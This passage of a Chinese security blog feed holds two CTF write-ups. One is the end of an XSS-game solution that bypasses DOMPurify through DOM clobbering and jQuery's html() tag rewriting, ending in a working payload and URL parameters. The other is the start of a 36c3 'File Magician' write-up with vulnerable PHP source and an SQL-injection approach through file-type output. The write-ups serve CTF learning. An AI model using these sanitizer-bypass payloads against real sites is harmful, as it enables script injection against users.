class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">let</span> notify = <span class="hljs-literal">false</span>;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">let</span> text = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">"text"</span>);</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">let</span> img = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">"img"</span>);</span></span><br><span class="line">  ...</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201222425.png" alt=""></p><h3 id="JQuery’s-‘mXSS’"><a href="#JQuery’s-‘mXSS’" class="headerlink" title="JQuery’s ‘mXSS’"></a>JQuery’s ‘mXSS’</h3><p>所以基本上 notify 的问题我们解决了，接下来就是 DOM Purify 的问题了。</p><p>我们可以知道最终我们要插入的代码是通过<code>$("#notify").html(html)</code>来插入的，而参数 html 又来自</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html = <span class="hljs-string">`&lt;div class="alert alert-warning" role="alert"&gt;&lt;b&gt;Meme&lt;/b&gt; created from <span class="hljs-subst">${DOMPurify.sanitize(text)}</span>&lt;/div&gt;`</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>简单跟一下 JQuery 的 <code>html()</code> 函数，我们可以发现有以下利用链：</p><p><a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L372" target="_blank" rel="noopener">html()</a>-&gt;<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L406" target="_blank" rel="noopener">append()</a>-&gt;<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L312" target="_blank" rel="noopener">doManip()</a>-&gt;<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L117" target="_blank" rel="noopener">buildFragment()</a>-&gt;<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation/buildFragment.js#L39" target="_blank" rel="noopener">htmlPrefilter()</a></p><p>在 <a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L202" target="_blank" rel="noopener">htmlPrefilter()</a> 函数中我们可以看到有这么一段代码：</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// source of htmlPrefilter()</span></span><br><span class="line">jQuery.extend( {</span><br><span class="line">truehtmlPrefilter: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"> html </span>) </span>{</span><br><span class="line">truetrue<span class="hljs-keyword">return</span> html.replace( rxhtmlTag, <span class="hljs-string">"&lt;$1&gt;&lt;/$2&gt;"</span> );</span><br><span class="line">true},</span><br><span class="line">    ...</span><br></pre></td></tr></tbody></table></figure><p></p><p>这段代码就是用来转换一些自闭合标签的标签，例如<code>&lt;blah/&gt;</code>变成<code>&lt;blah&gt;&lt;/blah&gt;</code>，我们就可以利用这个特性来实现一些绕过，例如：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span>Elon</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>经过<code>innerHTML</code>会变成</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-xml">   <span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span>Elon</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>但是经过 jquery <code>html()</code> 就会变成</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-xml">   <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="line">Elon</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以发现通过<code>html()</code>可以把一些自闭合的拆分，以及把内容转换出去，有点类似于 mXSS ，最终我们得到的是</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>Elon<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>所以我们可以利用这个特性绕过 XSS WAF，例如以下</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-actionscript">alert()<span class="hljs-comment">//</span></span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>经过<code>DOMPurify.sanitize</code>我们可以得到</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-actionscript">alert(<span class="hljs-number">1337</span>)<span class="hljs-comment">//</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>经过 jquery <code>html()</code>到最终渲染页面就变成了</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-handlebars"><span class="hljs-xml">alert(1337)//<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>所以这就是 JQuery’s 类似于 mXSS 的 trick</p><p>综上所述，配合我们之前的内容，最终 payload 如下：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">name</span>=<span class="hljs-string">notify</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-actionscript">alert()<span class="hljs-comment">//</span></span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>最终传参:</p><p></p><figure class="highlight xquery hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img=valid_img_url&amp;<span class="hljs-type">text</span>=&lt;img<span class="hljs-built_in"> name</span><span class="hljs-meta">%3dnotify</span>&gt;<span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style%2F</span>&gt;</span></span></span><span class="hljs-xml"><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert()%2F%2F</span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这里我也不是非常清楚作者为啥要加一个 img 参数//全程没有用到</p><p>最后再来一遍：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.redd.it/rz3o1yibnc511.png" alt=""></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="http://www.thespanner.co.uk/2013/05/16/dom-clobbering/" target="_blank" rel="noopener">DOM Clobbering</a></p><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement" target="_blank" rel="noopener">HTMLAnchorElement</a></p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;过年期间玩了一下国外的一个 XSS GAME，收获颇丰，记录一下学习过程。本人对于 JavaScript 以及前端的理解不深，水平也不高，如果文章有疏漏之处，还请师傅们斧正。&lt;/p&gt;
&lt;blockquote class=&quot;colorquote success&quot;&gt;&lt;p&gt;文章首发于安全客：&lt;a href=&quot;https://www.anquanke.com/post/id/198496&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/198496&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/categories/CTF/"/>
    
    
      <category term="XSS" scheme="https://blog.zeddyu.info/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>36c3 Web 学习记录</title>
    <link href="https://blog.zeddyu.info/2020/01/08/36c3-web/"/>
    <id>https://blog.zeddyu.info/2020/01/08/36c3-web/</id>
    <published>2020-01-08T02:24:13.000Z</published>
    <updated>2021-09-27T17:45:58.716Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>签到选手不请自来，经过了好几天的琢磨，终于把这次比赛的题目都弄得差不多了，这里记录一下本次比赛 Web 题目的解法。</p><blockquote class="colorquote success"><p>文章首发于先知社区：<a href="https://xz.aliyun.com/t/7081" target="_blank" rel="noopener">https://xz.aliyun.com/t/7081</a></p></blockquote><a id="more"></a><p>如果师傅们有更好更有意思的解法，欢迎多多与菜鸡交流。非常感谢 @rebirth @wonderkun @wupco 等师傅在我学习本次比赛赛题时候不厌其烦地指导我。</p><h2 id="File-Magician"><a href="#File-Magician" class="headerlink" title="File Magician"></a>File Magician</h2><blockquote><p><strong>Difficulty estimate</strong>: easy</p><p><strong>Solved</strong>:133/321</p><p><strong>Points</strong>: round(1000 · min(1, 10 / (9 + [133 solves]))) = <strong>70</strong> points</p><p><strong>Description:</strong></p><p>Finally (again), a minimalistic, open-source file hosting solution.</p><p><strong>Download:</strong></p><p><a href="https://github.com/ZeddYu/36c3-CTF-Web/blob/master/file%20magician/file%20magician-3ace41f3b0282a70.tar.xz" target="_blank" rel="noopener">file magician-3ace41f3b0282a70.tar.xz (2.1 KiB)</a></p></blockquote><p>算是 Web 当中的一个签到题，直接给出 Docker 文件源代码，我们可以在本地搭起来试试。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="hljs-number">0</span>);</span><br><span class="line">ini_set(<span class="hljs-string">'display_errors'</span>, <span class="hljs-number">0</span>);</span><br><span class="line">ini_set(<span class="hljs-string">'display_startup_errors'</span>, <span class="hljs-number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>( ! <span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">'id'</span>])) {</span><br><span class="line">    $_SESSION[<span class="hljs-string">'id'</span>] = bin2hex(random_bytes(<span class="hljs-number">32</span>));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$d = <span class="hljs-string">'/var/www/html/files/'</span>.$_SESSION[<span class="hljs-string">'id'</span>] . <span class="hljs-string">'/'</span>;</span><br><span class="line">@mkdir($d, <span class="hljs-number">0700</span>, <span class="hljs-keyword">TRUE</span>);</span><br><span class="line">chdir($d) || <span class="hljs-keyword">die</span>(<span class="hljs-string">'chdir'</span>);</span><br><span class="line"></span><br><span class="line">$db = <span class="hljs-keyword">new</span> PDO(<span class="hljs-string">'sqlite:'</span> . $d . <span class="hljs-string">'db.sqlite3'</span>);</span><br><span class="line">$db-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line">$db-&gt;exec(<span class="hljs-string">'CREATE TABLE IF NOT EXISTS upload(id INTEGER PRIMARY KEY, info TEXT);'</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_FILES[<span class="hljs-string">'file'</span>]) &amp;&amp; $_FILES[<span class="hljs-string">'file'</span>][<span class="hljs-string">'size'</span>] &lt; <span class="hljs-number">10</span>*<span class="hljs-number">1024</span> ){</span><br><span class="line">    $s = <span class="hljs-string">"INSERT INTO upload(info) VALUES ('"</span> .(<span class="hljs-keyword">new</span> finfo)-&gt;file($_FILES[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>]). <span class="hljs-string">" ');"</span>;</span><br><span class="line">    $db-&gt;exec($s);</span><br><span class="line">    move_uploaded_file( $_FILES[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>], $d . $db-&gt;lastInsertId()) || <span class="hljs-keyword">die</span>(<span class="hljs-string">'move_upload_file'</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$uploads = [];</span><br><span class="line">$sql = <span class="hljs-string">'SELECT * FROM upload'</span>;</span><br><span class="line"><span class="hljs-keyword">foreach</span> ($db-&gt;query($sql) <span class="hljs-keyword">as</span> $row) {</span><br><span class="line">    $uploads[] = [$row[<span class="hljs-string">'id'</span>], $row[<span class="hljs-string">'info'</span>]];</span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="hljs-string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="hljs-string">"utf-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;file magician&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;form enctype=<span class="hljs-string">"multipart/form-data"</span> method=<span class="hljs-string">"post"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="hljs-string">"file"</span> name=<span class="hljs-string">"file"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="hljs-string">"submit"</span> value=<span class="hljs-string">"upload"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;table&gt;</span><br><span class="line">    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">foreach</span>($uploads <span class="hljs-keyword">as</span> $upload):<span class="hljs-meta">?&gt;</span></span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;&lt;a href=<span class="hljs-string">"&lt;?= '/files/' . $_SESSION['id'] . '/' . $upload[0] ?&gt;"</span>&gt;<span class="hljs-meta">&lt;?</span>= $upload[<span class="hljs-number">0</span>] <span class="hljs-meta">?&gt;</span>&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="hljs-meta">&lt;?</span>= $upload[<span class="hljs-number">1</span>] <span class="hljs-meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endforeach</span><span class="hljs-meta">?&gt;</span></span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>题目功能点就是一个简单的文件上传，然后在自己的 sandbox 当中看到自己的文件类型，文件类型是由<code>(new finfo)-&gt;file</code>来判断的，还使用了 sqlite 进行存储文件上传的记录。</p><p>由于创建的数据库规定了 id 为自增长的整型主键，而且它使用了<code>lastInsertId()</code>返回最后一次 insert 数据的 id 作为文件名</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file( $_FILES[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>], $d . $db-&gt;lastInsertId()) || <span class="hljs-keyword">die</span>(<span class="hljs-string">'move_upload_file'</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>所以我们基本上可以不用考虑是否存在通过可控文件名上传文件 Getshell 的操作了。</p><p>纵观整个文件，其实我们可以发现，我们可控制的输入点也只有在文件类型当中，文件类型又被拼入到了 sql 语句当中</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$s = <span class="hljs-string">"INSERT INTO upload(info) VALUES ('"</span> .(<span class="hljs-keyword">new</span> finfo)-&gt;file($_FILES[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>]). <span class="hljs-string">" ');"</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>所以比较明显，我们只能通过这个来进行 sql 注入来进行一些操作了。</p><p>我的思路就是 fuzz 一些特殊的文件，可能存在某些文件使用<code>finfo</code>得出来的结果含有单引号什么的，并且我们还能够插入可控数据，于是我就开始 fuzz 文件头，从<code>0x00</code>到<code>0xff0xff</code>。</p><p>终于在<code>0x1f0x9d</code>得到一个文件类型是<code>compress'd data</code>，虽然有单引号，但是不存在我们可控的数据。</p><p>还有一个是<code>0xfb0x01</code>得到一个文件类型是<code>QDOS object ''</code>，看起来很对的样子，有两个单引号，并且我们貌似可以在单引号之间插入数据，我们可以随便测试一下</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXx